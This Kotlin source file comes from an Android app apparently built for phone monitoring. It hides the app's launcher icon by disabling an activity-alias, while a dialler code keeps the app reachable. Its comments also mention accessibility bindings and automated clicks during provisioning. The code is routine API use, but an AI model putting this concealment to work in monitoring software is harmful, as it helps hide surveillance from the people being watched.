package com.spapp.monitoring.ui

import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager
import android.util.Log
import com.spapp.monitoring.data.DeviceState

/**
 * Shows or hides the launcher entry by toggling the `.LauncherAlias`
 * activity-alias.
 *
 * Why the alias and not the activity: the alias is the component that carries
 * the MAIN/LAUNCHER intent-filter. Disabling it removes the home-screen and
 * app-drawer entry only - SplashActivity and MainActivity stay declared and
 * enabled, so deep links, the dialler restore code and any already-running task
 * keep working. Nothing else about the app changes: data, permissions and
 * accessibility bindings are untouched.
 *
 * The user reaches this through an explicit button in the app; the settings
 * service never clicks it (events from this package are ignored, and synthetic
 * clicks are confined to the provisioning window).
 */
object IconHider {

    private const val TAG = "IconHider"
    private const val ALIAS_SUFFIX = ".LauncherAlias"

    private fun alias(context: Context) =
        ComponentName(context, context.packageName + ALIAS_SUFFIX)

    /** True when the launcher entry is currently disabled. */
    fun isHidden(context: Context): Boolean = try {
        context.packageManager.getComponentEnabledSetting(alias(context)) ==
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED
    } catch (e: Exception) {
        Log.w(TAG, "Could not read the alias state, falling back to prefs", e)
        DeviceState(context).isIconHidden
    }

    /** Removes the launcher entry. Does not touch the process or any grant. */
    fun hide(context: Context) {
        try {
            context.packageManager.setComponentEnabledSetting(
                alias(context),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            DeviceState(context).isIconHidden = true
            Log.i(TAG, "Launcher alias disabled")
        } catch (e: Exception) {
            Log.e(TAG, "Could not hide the launcher alias", e)
        }
    }

    /** Restores the launcher entry. */
    fun show(context: Context) {
        try {
            context.packageManager.setComponentEnabledSetting(
                alias(context),
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
            DeviceState(context).isIconHidden = false
            Log.i(TAG, "Launcher alias enabled")
        } catch (e: Exception) {
            Log.e(TAG, "Could not show the launcher alias", e)
        }
    }
}
